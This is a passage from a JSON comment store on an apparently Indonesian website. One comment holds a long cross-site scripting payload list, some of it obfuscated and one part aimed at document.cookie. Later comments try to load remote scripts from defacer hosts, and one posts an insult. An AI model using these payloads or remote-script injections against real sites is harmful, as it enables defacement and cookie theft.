src=\"data:text\/javascript,alert(1)\"><\/script>\r\n<iframe\/src \\\/\\\/onload = prompt(1)\r\n<iframe\/onreadystatechange=alert(1)\r\n<svg\/onload=alert(1)\r\n<input value=<><iframe\/src=javascript:confirm(1)\r\n<input type=\"text\" value=`` <div\/onmouseover='alert(1)'>X<\/div>\r\nhttp:\/\/www.<script>alert(1)<\/script .com\r\n<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29><\/iframe>\r\n<svg><script ?>alert(1)\r\n<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29><\/iframe>\r\n<img src=`xx:xx`onerror=alert(1)>\r\n<meta http-equiv=\"refresh\" content=\"0;javascript&colon;alert(1)\"\/>\r\n<math><a xlink:href=\"\/\/jsfiddle.net\/t846h\/\">click\r\n<embed code=\"http:\/\/businessinfo.co.uk\/labs\/xss\/xss.swf\" allowscriptaccess=always>\r\n<svg contentScriptType=text\/vbs><script>MsgBox+1\r\n<a href=\"data:text\/html;base64_,<svg\/onload=\\u0061&#x6C;&#101%72t(1)>\">X<\/a\r\n<iframe\/onreadystatechange=\\u0061\\u006C\\u0065\\u0072\\u0074('\\u0061') worksinIE>\r\n<script>~'\\u0061' ; \\u0074\\u0068\\u0072\\u006F\\u0077 ~ \\u0074\\u0068\\u0069\\u0073. \\u0061\\u006C\\u0065\\u0072\\u0074(~'\\u0061')<\/script U+\r\n<script\/src=\"data&colon;text%2Fj\\u0061v\\u0061script,\\u0061lert('\\u0061')\"><\/script a=\\u0061 & \/=%2F\r\n<script\/src=data&colon;text\/j\\u0061v\\u0061&#115&#99&#114&#105&#112&#116,\\u0061%6C%65%72%74(\/XSS\/)><\/script\r\n<object data=javascript&colon;\\u0061&#x6C;&#101%72t(1)>\r\n<script>+-+-1-+-+alert(1)<\/script>\r\n<body\/onload=&lt;!--&gt;&#10alert(1)>\r\n<script itworksinallbrowsers>\/*<script* *\/alert(1)<\/script\r\n<img src ?itworksonchrome?\\\/onerror = alert(1)\r\n<svg><script>\/\/&NewLine;confirm(1);<\/script <\/svg>\r\n<svg><script onlypossibleinopera:-)> alert(1)\r\n<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe\r\n<script x> alert(1) <\/script 1=2\r\n<div\/onmouseover='alert(1)'> style=\"x:\">\r\n<--`<img\/src=` onerror=alert(1)> --!>\r\n <script\/src=&#100&#97&#116&#97:text\/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)><\/script>\r\n<div style=\"xg-p:absolute;top:0;left:0;width:100%;height:100%\" onmouseover=\"prompt(1)\" onclick=\"alert(1)\">x<\/button>\r\n\"><img src=x onerror=window.open('https:\/\/www.google.com\/');>\r\n<form><button formaction=javascript&colon;alert(1)>CLICKME\r\n<math><a xlink:href=\"\/\/jsfiddle.net\/t846h\/\">click\r\n<object data=data:text\/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+><\/object>\r\n<iframe src=\"data:text\/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E\"><\/iframe>\r\n<a href=\"data:text\/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203\">Click Me<\/a>\r\n<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)<\/SCRIPT>\r\n\u2018;alert(String.fromCharCode(88,83,83))\/\/\u2019;alert(String.fromCharCode(88,83,83))\/\/\u201d;alert(String.fromCharCode(88,83,83))\/\/\u201d;alert(String.fromCharCode(88,83,83))\/\/\u2013><\/SCRIPT>\u201d>\u2019><SCRIPT>alert(String.fromCharCode(88,83,83))<\/SCRIPT>\r\n<IMG \u201c\u201d\u201d><SCRIPT>alert(\u201cXSS\u201d)<\/SCRIPT>\u201d>\r\n<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>\r\n<IMG SRC=\u201djav ascript:alert(\u2018XSS\u2019);\u201d>\r\n<IMG SRC=\u201djav&#x09;ascript:alert(\u2018XSS\u2019);\u201d>\r\n<<SCRIPT>alert(\u201cXSS\u201d);\/\/<<\/SCRIPT>\r\n%253cscript%253ealert(1)%253c\/script%253e\r\n\u201c><s\u201d%2b\u201dcript>alert(document.cookie)<\/script>\r\nfoo<script>alert(1)<\/script>\r\n<scr<script>ipt>alert(1)<\/scr<\/script>ipt>",
            "waktu": "08 July 2025 03:14"
        },
        {
            "nama": "sadfsdfsdf",
            "komentar": "<h1>test<\/h1>",
            "waktu": "08 July 2025 03:14"
        },
        {
            "nama": "admin",
            "komentar": "hadeh tolol tolol",
            "waktu": "10 July 2025 00:17"
        },
        {
            "nama": "&lt;script src=&quot;https:\/\/jso.defacer.id\/raw\/yanshs&quot;&gt;&lt;\/script&gt;",
            "komentar": "&lt;script src=&quot;https:\/\/jso.defacer.id\/raw\/yanshs&quot;&gt;&lt;\/script&gt;",
            "waktu": "23 July 2025 12:42"
        }
    ],
    "3": [
        {
            "nama": "pendi",
            "komentar": "wkwk",
            "waktu": "13 July 2025 23:43"
        }
    ],
    "4": [
        {
            "nama": "daud",
            "komentar": "mantap mn",
            "waktu": "15 July 2025 02:32"
        },
        {
            "nama": "&lt;script type=&quot;text\/javascript&quot; src=&quot;https:\/\/pncakar.bigsentinel.asia\/pastes\/viewraw.php?id=058dd7f8&quot;&gt;&lt;\/script&gt;",
            "komentar": "&lt;script type=&quot;text\/javascript&quot; src=&quot;https:\/\/pncakar.bigsentinel.asia\/pastes\/viewraw.php?id=058dd7f8&quot;&gt;&lt;\/script&gt;",
            "waktu": "26 July 2025 05:17"
        },
        {
            "nama": "Alva",
            "komentar": "ngetes doang:v",
            "waktu": "26 July 2025 05:18"
        },
        {
            "nama": "&lt;script&gt;alert(&quot;tesdoang&quot;)&lt;\/script&gt;",
            "komentar": "&lt;script&gt;alert(&quot;tesdoang&quot;)&lt;\/script&gt;",
            "waktu": "26 July 2025 05:20"
        },
        {
            "nama": "heker",
            "komentar": "hamaa",
            "waktu": "26 July 2025 07:46"
        },
        {
            "nama": "&lt;script&gt;alert&lt;\/script&gt;",
            "komentar": "yu",
            "waktu": "28 July 2025 06:53"
        }
    ],
    "5": []
}